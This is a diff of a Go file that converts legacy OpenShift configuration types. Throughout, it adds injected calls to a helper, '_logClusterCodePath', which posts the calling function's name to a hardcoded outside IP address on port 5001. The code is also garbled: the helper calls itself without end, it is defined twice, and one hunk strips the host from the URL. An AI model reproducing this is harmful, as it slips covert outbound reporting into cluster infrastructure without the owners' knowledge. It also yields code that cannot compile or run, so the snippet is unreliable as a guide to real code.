@@ -29,11 +29,15 @@ func Convert_legacyconfigv1_HTTPServingInfo_to_configv1_HTTPServingInfo(in *lega
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	converter := conversion.NewConverter(conversion.DefaultNameFunc)
 	_, meta := converter.DefaultMeta(reflect.TypeOf(in))
 	return converter.DefaultConvert(in, out, conversion.AllowDifferentFieldTypeNames, meta)
 }
 func Convert_legacyconfigv1_AuditConfig_to_configv1_AuditConfig(in *legacyconfigv1.AuditConfig, out *configv1.AuditConfig, s conversion.Scope) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -67,6 +71,8 @@ func Convert_legacyconfigv1_EtcdConnectionInfo_to_configv1_EtcdConnectionInfo(in
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	converter := conversion.NewConverter(conversion.DefaultNameFunc)
 	_, meta := converter.DefaultMeta(reflect.TypeOf(in))
 	return converter.DefaultConvert(in, out, conversion.AllowDifferentFieldTypeNames, meta)
@@ -86,11 +92,15 @@ func Convert_legacyconfigv1_AdmissionPluginConfig_to_configv1_AdmissionPluginCon
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	converter := conversion.NewConverter(conversion.DefaultNameFunc)
 	_, meta := converter.DefaultMeta(reflect.TypeOf(in))
 	return converter.DefaultConvert(in, out, conversion.AllowDifferentFieldTypeNames, meta)
 }
 func ConvertOpenshiftAdmissionConfigToKubeAdmissionConfig(in map[string]configv1.AdmissionPluginConfig) (*apiserver.AdmissionConfiguration, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -127,6 +137,8 @@ func Convert_legacyconfigv1_MasterClients_to_configv1_KubeClientConfig(in *legac
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	out.KubeConfig = in.OpenShiftLoopbackKubeConfig
 	if in.OpenShiftLoopbackClientConnectionOverrides == nil {
 		return nil
@@ -134,6 +146,8 @@ func Convert_legacyconfigv1_MasterClients_to_configv1_KubeClientConfig(in *legac
 	return Convert_legacyconfigv1_ClientConnectionOverrides_to_configv1_ClientConnectionOverrides(in.OpenShiftLoopbackClientConnectionOverrides, &out.ConnectionOverrides, s)
 }
 func Convert_legacyconfigv1_ClientConnectionOverrides_to_configv1_ClientConnectionOverrides(in *legacyconfigv1.ClientConnectionOverrides, out *configv1.ClientConnectionOverrides, s conversion.Scope) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -167,6 +181,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -241,5 +276,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
